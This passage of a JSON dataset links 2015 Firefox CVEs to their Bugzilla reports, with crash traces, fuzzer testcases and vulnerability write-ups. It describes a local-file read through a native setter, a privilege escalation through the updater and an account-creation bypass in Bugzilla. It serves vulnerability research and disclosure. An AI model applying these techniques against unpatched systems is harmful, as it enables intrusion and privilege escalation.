==8659==ABORTING"
      }
    ],
    "CVE-2015-4494": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1138808",
        "title": "Permission bypass for Wifi direct system messages",
        "description": "I'm not sure when WifiDirect was enabled but there appears to be no permission checks on the system messages: https://dxr.mozilla.org/mozilla-central/source/dom/messages/SystemMessagePermissionsChecker.jsm#127 Unless I'm mistaken, that means any app could listen for these system messages, which is probably a privacy issue? It is documented as requiring the \"wifi-manage\" permission, but this is not how it is implemented. Marking as secure just in case, but its publicly documented so not sure how useful that is. If this is actually an oversight, then this is probably a blocking bug, so marking 2.2? The sec-rating is a guess, im not sure of the actually implication here, it may not actually be too bad."
      }
    ],
    "CVE-2015-4495": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1178058",
        "title": "It's possible to read local files or perform privilege escalation by using a native setter",
        "description": "This one is a really complex issue and it's me so I'm really going to try to condense this down. https://mxr.mozilla.org/mozilla-central/source/dom/xml/nsXMLPrettyPrinter.cpp#114 You can start reading there to begin to understand this. Just get a general idea of what is happening as it's not terribly important except for one key detail. That is the fact that it is from c++ code that the prettyprint bindings for xml data are loaded. This involves importing two style sheets into the document, both of which don't show up through document.childNodes, but references to them are accessible through document.styleSheets. These references get the normal native anonymous content protection goodness, but that can be bypassed with access to the XBL execution context. I'm using pieces of my older work from bug 1045034 for that bypass, but I'm fairly close I believe to having another method of achieving the same thing. Now to the interesting parts. Once you have access to these references one who looks will notice that the prototypes accessible from the ownerNode of the style sheet are prototypes which provide access to native methods. Here I'm tracing the __proto__ chain up to the Object prototype and using the native __lookupSetter__ method to bypass restrictions on windows that I shouldn't have access to. Using this over powered __lookupSetter__ function I then get the location setter of a window that is inaccessible to me otherwise. With this location setter it's possible to bypass all restriction when setting the location property of any window except those that are chrome privileged. In the testcase I'm attaching with this I use this location setter on a pdf viewer window to inject javascript into it via a javascript URI. I then have it load a local file because resource:// pages have that ability and still using the same OP location setter I show javascript execution in that window to prove that in fact the contents of the file loaded are fully accessible from content. There, and that's as condensed down as possible for an issue this complicated I believe(for me). I still have to mention that it's also possible to manipulate about:home windows to achieve chrome privilege escalation but without a way to inject script into it, I thought this was more interesting. I hope I didn't kill you guys with all that, and also let me know if this works in windows ok. you OSX guys will just have to trust the word of others."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1179262",
        "title": "Remove PlayPreview registration from PDF Viewer",
        "description": "(As a temporary solution?) that will make transition to OOP jsplugins easier. PlayPreview will be removed as a part of the jsplugins and moving PDF viewer to out-of-process architecture might take some time. Also it will be useful to have capturing of the original content stream implemented (bug 964435) -- the PlayPreview lacks of this functionality as well. We want to change logic of EMBED tags to disable any instantiation of the native PDF plugins if the internal PDF viewer is enabled. That will allow its stream converter take a priority. This also allows to use the original data stream, and not re-create a new one."
      }
    ],
    "CVE-2015-4496": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1149605",
        "title": "Security Vulnerability in StageFright MP4 Processing",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36 Firefox for Android Steps to reproduce: Audited source and discovered an issue in the StageFright code shipping with Firefox. Developed proof-of-concept code. I apologize for the brief details here, I will attach proof-of-concept code and an advisory with much more detail soon. Actual results: Crashed with the potential for arbitrary code execution Expected results: Failed to render."
      }
    ],
    "CVE-2015-4499": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1202447",
        "title": "[SECURITY] The email address is not properly validated during registration if longer than 127 characters",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36 Steps to reproduce: Hello, My name is Netanel Rubin, I work as a vulnerability researcher at PerimeterX. This is a critical vulnerability report for an issue I discovered in the Bugzilla platform. The successful exploitation of the vulnerability allows the creation of a user account under any email address, even those which are not under the attacker control. As a PoC, I've created a test account under bugzilla.mozilla.org: bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb@mozilla.com I apologize for the length, it is required for the vulnerability. I would like to report the complete vulnerability description over a private channel. I can post it here like the last time or can mail it to you, so please contact me at nati (-at-) perimeterx or in this thread. Please assign a CVE number for this issue. We would also like to coordinate the public disclosure with you. Best regards, Netanel."
      }
    ],
    "CVE-2015-4500": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1152026",
        "title": "IndexedDB cycle-collection crash, probably",
        "description": "I'm using IndexedDB on workers, which rocks. But my (stock, mozilla.org-built linux x86_64) nightly builds are crashing a lot in the cycle collector it seems. Here's one: bp-d90ca7bb-15bc-4ab7-8ef3-a26d12150407 And all of these but the windows one seem to be me: https://crash-stats.mozilla.com/report/list?product=Firefox&signature=ChildFinder%3A%3ANoteJSObject%28JSObject*%29#tab-reports Here's the summary of sorts from the stack provided by the crash reporter infrastructure: ChildFinder::NoteJSObject(JSObject*) TraceCallbackFunc::Trace(JS::Heap<JSObject*>*, char const*, void*) const mozilla::DOMEventTargetHelper::cycleCollection::Traverse(void*, nsCycleCollectionTraversalCallback&) mozilla::dom::indexedDB::IDBWrapperCache::cycleCollection::Traverse(void*, nsCycleCollectionTraversalCallback&) mozilla::dom::indexedDB::IDBTransaction::cycleCollection::Traverse(void*, nsCycleCollectionTraversalCallback&) void nsPurpleBuffer::Block::VisitEntries<RemoveSkippableVisitor>(nsPurpleBuffer&, RemoveSkippableVisitor&) nsPurpleBuffer::RemoveSkippable(nsCycleCollector*, bool, bool, void (*)()) nsCycleCollector_forgetSkippable(bool, bool) FireForgetSkippable CCTimerFired Note that I did initially suspect the devtools indexeddb inspector was at play, and commented to that effect, but I've stopped using that. I'm going to spin a local debug build and switch to that and see if there are any helpful assertion explosions that show up there."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1202844",
        "title": "crash in nsXBLService::GetBinding",
        "description": "Based on https://bugzilla.mozilla.org/show_bug.cgi?id=1197321#c5 I think baseBindingURI (which is nIURI*) is deleted object in nsXBLService::GetBinding. If we get nested GetBinding calls, LoadBindingDocumentInfo may spin event loop, as far as I see, and that may do, well, whatever. See Bug 1197321"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1183153",
        "title": "Assertion failure: MIR instruction returned object with unexpected type, at js/src/jit/MacroAssembler.cpp:1789",
        "description": "The following testcase crashes on mozilla-central revision eab21ec484bb (build with --enable-optimize --enable-posix-nspr-emulation --enable-valgrind --enable-gczeal --disable-tests --enable-debug, run with --fuzzing-safe --thread-count=2 --ion-eager --ion-offthread-compile=off): gczeal(1); var lfGlobal = newGlobal(); lfGlobal.offThreadCompileScript(\"(function* p() {});\"); lfGlobal.runOffThreadScript(); Backtrace: Program received signal SIGTRAP, Trace/breakpoint trap. 0x00007ffff7fd321d in ?? () #0 0x00007ffff7fd321d in ?? () #1 0x00007ffff7e7c060 in ?? () #2 0x00007ffff7fe8bcd in ?? () #3 0x0000000000000204 in ?? () #4 0x00007ffff7e9e12a in ?? () #5 0x0000000000000000 in ?? () rax 0x7ffff4800000 140737295417344 rbx 0x7ffff69811c0 140737330549184 rcx 0x7ffff7e91610 140737352635920 rdx 0x7fffffffbf28 140737488338728 rsi 0x7ffff7e00000 140737352040448 rdi 0x7fffffffb7e0 140737488336864 rbp 0x7fffffffb8e0 140737488337120 rsp 0x7fffffffb878 140737488337016 r8 0x0 0 r9 0x7ffff4800000 140737295417344 r10 0xc7ce0c7ce0c7ce0d -4049285284472828403 r11 0x7ffff6c27960 140737333328224 r12 0x8 8 r13 0x7fffffffbf28 140737488338728 r14 0x204 516 r15 0x7fffffffbee0 140737488338656 rip 0x7ffff7fd321d 140737353953821 => 0x7ffff7fd321d: push %r10 0x7ffff7fd321f: push %r9 Filing s-s because the test involves GC."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1201793",
        "title": "\"Assertion failure: !has(reg), at ../../../gecko/js/src/jit/RegisterSets.h:860\" in B2G debug build on Z3C",
        "description": "I am trying to produce a debug build for my Z3C. When I do, the homescreen app hits this assertion a couple of seconds after starting: Assertion failure: !has(reg), at ../../../gecko/js/src/jit/RegisterSets.h:860 I followed these steps from my B2G checkout to produce the build: $ git pull $ rm -rf objdir-gecko out $ repo forall -c 'git reset --hard' $ repo forall -c 'git clean -f -d' $ repo sync -d $ ./config.sh aries $ ./build.sh $ ./flash.sh and my .userconfig is: export B2G_DEBUG=1 export NOFTU=1 export DEVICE_DEBUG=1"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1161063",
        "title": "Getting a stored MutableFile out of IndexedDB on a worker doesn't work",
        "description": "While studying how web workers were implemented for IndexedDB, I believe I found a threading violation where a DOM method is executed on a worker but can trigger a method that can only be executed on the main thread. The call stack would be as follows: IDBObjectStore::Add || IDBObjectStore::Put -- exposed on WebIDL IDBObjectStore::AddOrPut -- asserts owning thread (due to Exposed=Worker, may not be main thread) IDBObjectStore::GetAddInfo [ KeyPath::ExtractOrCreateKey -> GetJSValFromKeyPathString ] -- optional IDBObjectStore::GetAddInfoCallback JSAutoStructuredCloneBuffer::write JS_WriteStructuredClone WriteStructuredClone JSStructuredCloneWriter::write JSStructuredCloneWriter::startWrite -- calls callback->write, see below StructuredCloneWriteCallback IDBDatabase::GetQuotaInfo -- asserts main thread This looks to be a corner case; we are trying to store a mutable file where our reference to the database for the write mismatches that of the file. Hopefully I did not miss a dispatch to the main thread somewhere along the way."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1186962",
        "title": "Assertion failure: opn->isArity(PN_NAME), at frontend/ParseNode.cpp:852 or Crash [@ js::frontend::BytecodeEmitter::emitTree] with Arrow function",
        "description": "The following testcase crashes on mozilla-central revision 2ddec2dedced (build with --enable-optimize --enable-posix-nspr-emulation --enable-valgrind --enable-gczeal --disable-tests --disable-debug, run with --fuzzing-safe --thread-count=2): for (var { __proto__: { } = ( ) => current } in {}) {} Backtrace: Program received signal SIGSEGV, Segmentation fault. 0x0000000000555551 in js::frontend::BytecodeEmitter::emitTree (this=this@entry=0x7fffffffc530, pn=pn@entry=0x0) at js/src/frontend/BytecodeEmitter.cpp:7529 #0 0x0000000000555551 in js::frontend::BytecodeEmitter::emitTree (this=this@entry=0x7fffffffc530, pn=pn@entry=0x0) at js/src/frontend/BytecodeEmitter.cpp:7529 #1 0x0000000000558c5d in js::frontend::BytecodeEmitter::emitDefault (this=0x7fffffffc530, defaultExpr=0x0) at js/src/frontend/BytecodeEmitter.cpp:3820 #2 0x000000000055b417 in js::frontend::BytecodeEmitter::emitDestructuringOpsObjectHelper (this=this@entry=0x7fffffffc530, pattern=pattern@entry=0x7ffff69913a0, emitOption=emitOption@entry=js::frontend::InitializeVars) at js/src/frontend/BytecodeEmitter.cpp:4022 #3 0x000000000055adbb in js::frontend::BytecodeEmitter::emitDestructuringOpsHelper (this=this@entry=0x7fffffffc530, pattern=pattern@entry=0x7ffff69913a0, emitOption=emitOption@entry=js::frontend::InitializeVars) at js/src/frontend/BytecodeEmitter.cpp:4107 #4 0x000000000055a028 in emitDestructuringOps (isLet=false, pattern=0x7ffff69913a0, this=0x7fffffffc530) at js/src/frontend/BytecodeEmitter.cpp:4118 #5 js::frontend::BytecodeEmitter::emitAssignment (this=this@entry=0x7fffffffc530, lhs=0x7ffff69913a0, op=op@entry=JSOP_NOP, rhs=rhs@entry=0x0) at js/src/frontend/BytecodeEmitter.cpp:4580 #6 0x000000000055bdde in js::frontend::BytecodeEmitter::emitForIn (this=0x7fffffffc530, pn=<optimized out>, top=<optimized out>) at js/src/frontend/BytecodeEmitter.cpp:5492 #7 0x000000000055c4a5 in js::frontend::BytecodeEmitter::emitFor (this=this@entry=0x7fffffffc530, pn=pn@entry=0x7ffff69914b8, top=top@entry=0) at js/src/frontend/BytecodeEmitter.cpp:5708 #8 0x0000000000555898 in js::frontend::BytecodeEmitter::emitTree (this=this@entry=0x7fffffffc530, pn=0x7ffff69914b8) at js/src/frontend/BytecodeEmitter.cpp:7646 #9 0x0000000000556e45 in js::frontend::CompileScript (cx=cx@entry=0x7ffff6981040, alloc=<optimized out>, scopeChain=..., enclosingStaticScope=..., enclosingStaticScope@entry=..., evalCaller=..., evalCaller@entry=..., options=..., srcBuf=..., source_=source_@entry=0x0, staticLevel=staticLevel@entry=0, extraSct=extraSct@entry=0x0) at js/src/frontend/BytecodeCompiler.cpp:409 #10 0x000000000089ca36 in Compile (cx=cx@entry=0x7ffff6981040, options=..., scopeOption=scopeOption@entry=HasSyntacticScope, srcBuf=..., script=script@entry=...) at js/src/jsapi.cpp:3931 #11 0x000000000089cb3f in Compile (script=..., length=<optimized out>, chars=0x7ffff6902e80 u\"for (var { __proto__: { } = ( ) => current } in {}) {}\\n\", scopeOption=HasSyntacticScope, options=..., cx=0x7ffff6981040) at js/src/jsapi.cpp:3940 #12 Compile (cx=cx@entry=0x7ffff6981040, options=..., scopeOption=scopeOption@entry=HasSyntacticScope, bytes=<optimized out>, length=57, script=script@entry=...) at js/src/jsapi.cpp:3955 #13 0x00000000008c1fb1 in Compile (script=..., fp=0x7fffffffd880, scopeOption=HasSyntacticScope, options=..., cx=cx@entry=0x7ffff6981040) at js/src/jsapi.cpp:3966 #14 JS::Compile (cx=cx@entry=0x7ffff6981040, options=..., file=file@entry=0x7ffff6997800, script=script@entry=...) at js/src/jsapi.cpp:4006 #15 0x0000000000426063 in RunFile (compileOnly=false, file=0x7ffff6997800, filename=<optimized out>, cx=0x7ffff6981040) at js/src/shell/js.cpp:449 #16 Process (cx=cx@entry=0x7ffff6981040, filename=<optimized out>, forceTTY=forceTTY@entry=false) at js/src/shell/js.cpp:576 #17 0x000000000043657d in ProcessArgs (op=0x7fffffffdbc0, cx=0x7ffff6981040) at js/src/shell/js.cpp:5771 #18 Shell (envp=<optimized out>, op=0x7fffffffdbc0, cx=0x7ffff6981040) at js/src/shell/js.cpp:6040 #19 main (argc=<optimized out>, argv=<optimized out>, envp=<optimized out>) at js/src/shell/js.cpp:6384 rax 0x7fffffffc5d8 140737488340440 rbx 0x7fffffffc530 140737488340272 rcx 0x51 81 rdx 0x7ffff693c0a0 140737330266272 rsi 0x0 0 rdi 0x7fffffffc530 140737488340272 rbp 0x0 0 rsp 0x7fffffffbf20 140737488338720 r8 0x7ffff691b6b0 140737330132656 r9 0x7ffff691b6b0 140737330132656 r10 0x7ffff6913400 140737330099200 r11 0x7ffff47ad680 140737295079040 r12 0x7ffff69913d8 140737330615256 r13 0x2 2 r14 0x7fffffffbf30 140737488338736 r15 0x1 1 rip 0x555551 <js::frontend::BytecodeEmitter::emitTree(js::frontend::ParseNode*)+113> => 0x555551 <js::frontend::BytecodeEmitter::emitTree(js::frontend::ParseNode*)+113>: mov 0x4(%rbp),%esi 0x555554 <js::frontend::BytecodeEmitter::emitTree(js::frontend::ParseNode*)+116>: mov 0x10(%rax),%r13"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1044077",
        "title": "Change jemalloc poison address to something that is not a nop-slide",
        "description": "In bug 1036779 comment 4, nbp pointed out that the 0x5a5a5a5a poison value actually turns into valid instructions, so if the JIT ends up running over freed memory, it doesn't crash. Somebody should figure out what kind of value we can use for poisoning that will fail when directly executed. (I'm marking this s-s for now, but maybe it is obvious to anybody who would be writing an exploit, and so it doesn't need to be hidden.)"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1181651",
        "title": "crash in CmpInstructions",
        "description": "This bug was filed from the Socorro interface and is report bp-f09852df-ab9d-4f18-bd12-e2f962150705. ============================================================= Moderately high crash on 40b1. Thanks to COMDAT folding, there is a substitute \"cmp\" function from IonMonkey, but rest assured this is media code. It looks like an out-of-bounds read on the array, since the addresses are often just over a page boundary. 0a53f394 6b2994f0 xul!CmpInstructions+0xf 0a53f3c0 6b2a14ff xul!stagefright::VectorImpl::sort+0x4d 0a53f44c 6b2a051c xul!stagefright::MPEG4Source::exportIndex+0x1b7 0a53f478 6b29eef4 xul!mp4_demuxer::MP4Metadata::ReadTrackIndex+0x52 0a53f4b0 6bc1d5f1 xul!mp4_demuxer::MP4Demuxer::Init+0xb8 0a53f4ec 6bc1eb72 xul!mozilla::InvokeAndRetry<mozilla::MP4Reader,bool>+0x37 0a53f520 6bb980de xul!mozilla::MP4Reader::ReadMetadata+0x3e 0a53f540 6bba32cd xul!mozilla::MediaDecoderReader::AsyncReadMetadata+0x9e 0a53f554 6bbae33c xul!mozilla::detail::MethodCallWithNoArgs<mozilla::MediaPromise<nsRefPtr<mozilla::MetadataHolder>,enum mozilla::ReadMetadataFailureReason,1>,mozilla::MediaDecoderReader>::Invoke+0x11 0a53f564 6bb8c3a7 xul!mozilla::detail::ProxyRunnable<mozilla::MediaPromise<nsRefPtr<mozilla::MetadataHolder>,enum mozilla::ReadMetadataFailureReason,1> >::Run+0x12 0a53f580 6bbafad5 xul!mozilla::AutoTaskDispatcher::TaskGroupRunnable::Run+0x4f 0a53f5cc 6ad7b899 xul!mozilla::MediaTaskQueue::Runner::Run+0xb7 0a53f5f4 6aabf149 xul!nsThreadPool::Run+0x238"
      }
    ],
    "CVE-2015-4501": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1186657",
        "title": "Crash (UAF) in VideoCaptureImpl::SetCaptureRotation",
        "description": "Crashes seen in crashstats in webrtc::videocapturemodule::VideoCaptureImpl::SetCaptureRotation(webrtc::VideoCaptureRotation) with fairly apparent UAF addresses"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1165706",
        "title": "Crash [@ SkPixelRef::unlockPixels() ] | [@ mozilla::net::HttpChannelChild::OnStopRequest(nsresult const&, mozilla::net::ResourceTimingStruct const&) ]",
        "description": "1. http://plus.shonenjump.com/client_info/SHUEISHA/html/player/viewer.html?tw=1&lin=1&cid=SHSA_JP01PLUS00001593_57 2. Crash Opt/Debug Nightly on OSX. Doesn't Crash Release. bp-7508f335-408f-4579-9959-6aa952150517 [@ SkPixelRef::unlockPixels() ] bp-dd9ca7ab-b5c4-495e-acdb-67ae72150517 [@ mozilla::net::HttpChannelChild::OnStopRequest(nsresult const&, mozilla::net::ResourceTimingStruct const&) ] Debug [@ SkImageInfo::validate() ] Operating system: Mac OS X 10.9.5 13F1077 CPU: amd64 family 6 model 42 stepping 7 4 CPUs Crash reason: EXC_BAD_ACCESS / KERN_INVALID_ADDRESS Crash address: 0xffffffffbbadbeef Process uptime: 22 seconds Thread 45 (crashed) 0 XUL!SkImageInfo::validate() const [SkBitmap.cpp : 1401 + 0xf] rax = 0x00000000bbadbeef rdx = 0x49003ab2af83cba7 rcx = 0x000000012994a1b0 rbx = 0x000000012994b000 rsi = 0x49003ab2af83cba7 rdi = 0x0000390000003a03 rbp = 0x000000012994a200 rsp = 0x000000012994a1f0 r8 = 0x0000000000000040 r9 = 0x0000000129949f00 r10 = 0x000000000000007d r11 = 0x0000000000000206 r12 = 0x0000000000005d0f r13 = 0x0000000000000000 r14 = 0x00000001288bdfe0 r15 = 0x000000010136c320 rip = 0x0000000106acddbc s-s due to badbeef"
      }
    ],
    "CVE-2015-4503": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=994337",
        "title": "mozTCPSocket leaks client memory to server",
        "description": "I noticed something weird while testing the TCPSocket implementation. Linux bob 3.5.0-48-generic #72~precise1-Ubuntu SMP Tue Mar 11 20:09:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0 STR 1. run nc on server, depends on distro nc -l -v 8000 or nc -l -p 8000 2. Enable mozTCPSocket by adding the about:config value dom.mozTCPSocket.enabled = true 3. Open up web console in chrome privileged page, e.g. about:config var sock = navigator.mozTCPSocket.open(\"localhost\", 8000, {binaryType: \"string\"}) sock.send(new Uint8Array(65535)) You may have to call send() more than once. Result netcat shows output beginning with [object Uint8Array] followed by a bunch of gibberish / strings which appear to be from the Firefox process Expected No output or error"
      }
    ],
    "CVE-2015-4504": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1132467",
        "title": "[qcms] stack buffer overread in lut_inverse_interp16",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36 Steps to reproduce: Load ICC file 012d065588837d069fc28baa44744c5d in a transformation. Actual results: stack-buffer-overflow READ of size 2 lut_inverse_interp16 qcms/src/transform_util.c:378:14 The calculation of cell0 on line 373 is wrong which leads to a negative offset into LutTable. Potentially, this can be used to disclose data from the stack because the read value is later used in the precached transformation. (gdb) p length $2529 = 256 371 val2 = (length-1) * ((double) (x - 1) / 65535.0); (gdb) info locals l = -258 r = -258 x = -257 res = 65535 NumZeroes = 0 NumPoles = 255 cell0 = -156712448 cell1 = 32767 val2 = 1.2598673968951787e-321 y0 = 6.9533490648866048e-310 y1 = 6.9533557036156112e-310 x0 = 6.9533558073464722e-310 x1 = 7.2035640719190427e-317 a = 0 b = 6.9533491707515823e-310 f = 6.9533484734308871e-310 (gdb) n 373 cell0 = (int) floor(val2); (gdb) info locals l = -258 r = -258 x = -257 res = 65535 NumZeroes = 0 NumPoles = 255 cell0 = -156712448 cell1 = 32767 val2 = -1.0038910505836576 y0 = 6.9533490648866048e-310 y1 = 6.9533557036156112e-310 x0 = 6.9533558073464722e-310 x1 = 7.2035640719190427e-317 a = 0 b = 6.9533491707515823e-310 f = 6.9533484734308871e-310 (gdb) n 374 cell1 = (int) ceil(val2); (gdb) info locals l = -258 r = -258 x = -257 res = 65535 NumZeroes = 0 NumPoles = 255 cell0 = -2 cell1 = 32767 val2 = -1.0038910505836576 y0 = 6.9533490648866048e-310 y1 = 6.9533557036156112e-310 x0 = 6.9533558073464722e-310 x1 = 7.2035640719190427e-317 a = 0 b = 6.9533491707515823e-310 f = 6.9533484734308871e-310"
      }
    ],
    "CVE-2015-4505": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1177861",
        "title": "Arbitrary file manipulation through updater.exe (Privilege Escalation)",
        "description": "The updater.exe which is shipped with Firefox 38.0.5 opens the possibility for a local user to manipulate arbitrary files. That can be exploited for example with the maintenance service to run arbitrary executables files with the same privileges as the service. The vulnerability exists in the process of executing a staged update. During this process the updated files are written to an user controlled working directory. Also temporary update files like *.patch files are written to this directory. As in Bug #925747 these files can be manipulated to change how files are updated, if the attacker sets the working directory path to a writeable location. Manipulations are limited to files in the working directory but with a junction it is possible to break out of the working directory and change arbitrary files. Different to hard links a standard windows user has the rights to create junctions (win7). The poc needs firefox 38.0.5 (http://ftp.mozilla.org/pub/mozilla.org/firefox/releases/38.0.5/win32/en-US/Firefox%20Setup%2038.0.5.exe) installed to \"C:\\Program Files (x86)\\Mozilla Firefox\", the maintenance service and ruby. I have tested the poc with win7 pro. The poc tries to execute a staged update with a junction-prepared working directory and manipulated .manifest and .patch files. For the manipulation the right timing is needed so the poc tries again if it fails. On my computer I need 3-20 tries. After the poc succeeded the content of the helper.exe in the firefox directory is replaced with the content of the standard cmd.exe of windows. And this replaced helper.exe is running in the background with system rights (after an update with the maintenance service the service executes the helper.exe if an updater.ini is present)."
      }
    ],
    "CVE-2015-4506": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1192226",
        "title": "vp9_init_context_buffers",
        "description": "The attached webm file crash. 0b3df40c 52fb6769 MSVCR120!memset+0x75 [f:\\dd\\vctools\\crt\\crtw32\\string\\i386\\memset.asm @ 136] 0b3df428 52fb6960 xul!setup_mi+0x4b [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\media\\libvpx\\vp9\\common\\vp9_alloccommon.c @ 49] 0b3df430 52feca10 xul!vp9_init_context_buffers+0x8 [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\media\\libvpx\\vp9\\common\\vp9_alloccommon.c @ 197] 0b3df440 52fecd0f xul!resize_context_buffers+0x95 [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\media\\libvpx\\vp9\\decoder\\vp9_decodeframe.c @ 650] 0b3df460 52fec6ff xul!setup_frame_size+0x26 [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\media\\libvpx\\vp9\\decoder\\vp9_decodeframe.c @ 659] 0b3df488 52fed4be xul!read_uncompressed_header+0x217 [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\media\\libvpx\\vp9\\decoder\\vp9_decodeframe.c @ 1251] 0b3df530 52ff0016 xul!vp9_decode_frame+0x6e [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\media\\libvpx\\vp9\\decoder\\vp9_decodeframe.c @ 1455] 0b3df564 5306601c xul!vp9_receive_compressed_data+0x112 [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\media\\libvpx\\vp9\\decoder\\vp9_decoder.c @ 264] 0b3df5e8 530661fa xul!decode_one+0xbe [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\media\\libvpx\\vp9\\vp9_dx_iface.c @ 312] 0b3df648 53088465 xul!decoder_decode+0x17f [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\media\\libvpx\\vp9\\vp9_dx_iface.c @ 412] 0b3df664 52ab0456 xul!vpx_codec_decode+0x3e [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\media\\libvpx\\vpx\\src\\vpx_decoder.c @ 123] 0b3df848 52ab0795 xul!mozilla::SoftwareWebMVideoDecoder::DecodeVideoFrame+0x1ff [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\dom\\media\\webm\\softwarewebmvideodecoder.cpp @ 153] 0b3df864 52a4d7c3 xul!mozilla::WebMReader::DecodeVideoFrame+0x4c [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\dom\\media\\webm\\webmreader.cpp @ 1049] 0b3df890 52a43ab5 xul!mozilla::MediaDecoderReader::RequestVideoData+0x76 [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\dom\\media\\mediadecoderreader.cpp @ 289] 0b3df8b0 52a4e358 xul!mozilla::detail::MethodCallWithTwoArgs<mozilla::MediaPromise<nsRefPtr<mozilla::VideoData>,enum mozilla::MediaDecoderReader::NotDecodedReason,1>,mozilla::MediaDecoderReader,bool,__int64>::Invoke+0x1c [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\dom\\media\\mediapromise.h @ 621] 0b3df8c0 52a4fb39 xul!mozilla::detail::ProxyRunnable<mozilla::MediaPromise<nsRefPtr<mozilla::AudioData>,enum mozilla::MediaDecoderReader::NotDecodedReason,1> >::Run+0x12 [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\dom\\media\\mediapromise.h @ 639] 0b3df8e4 51b87509 xul!mozilla::MediaTaskQueue::Runner::Run+0xbd [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\dom\\media\\mediataskqueue.cpp @ 233] 0b3df90c 51b8f5a6 xul!nsThreadPool::Run+0x238 [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\xpcom\\threads\\nsthreadpool.cpp @ 227] 0b3dfa2c 51c1c455 xul!nsThread::ProcessNextEvent+0x2b2 [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\xpcom\\threads\\nsthread.cpp @ 861] 0b3dfa48 51c1c3e8 xul!NS_ProcessNextEvent+0x1a [c:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\xpcom\\glue\\nsthreadutils.cpp @ 265]"
      }
    ],
    "CVE-2015-4511": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1200148",
        "title": "Heap-buffer-overflow due to overflow in nestegg_track_codec_data",
        "description": "Tested on: OS: Ubuntu 14.04 Firefox: ASAN debug-build from https://ftp.mozilla.org/pub/mozilla.org/firefox/tinderbox-builds/mozilla-central-linux64-asan-debug/latest/ ASAN-trace: ================================================================= ==28309==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6070000d1b9b at pc 0x46fac7 bp 0x7f81856f75f0 sp 0x7f81856f6db0 READ of size 110 at 0x6070000d1b9b thread T26 (MediaPl~back #1) #0 0x46fac6 in memcpy /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:366 #1 0x7f81acac2b87 in void AssignRangeAlgorithm<true, true>::implementation<unsigned char, unsigned char, unsigned long, unsigned long>(unsigned char*, unsigned long, unsigned long, unsigned char const* ) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/obj-firefox/media/libstagefright/../../dist/include/nsTArray.h:559 #2 0x7f81aca86265 in unsigned char* nsTArray_Impl<unsigned char, nsTArrayInfallibleAllocator>::AppendElements<unsigned char, nsTArrayInfallibleAllocator>(unsigned char const*, unsigned long) /builds/sl ave/m-cen-l64-asan-d-0000000000000/build/src/obj-firefox/media/libstagefright/../../dist/include/nsTArray.h:1510 #3 0x7f81b07467d0 in 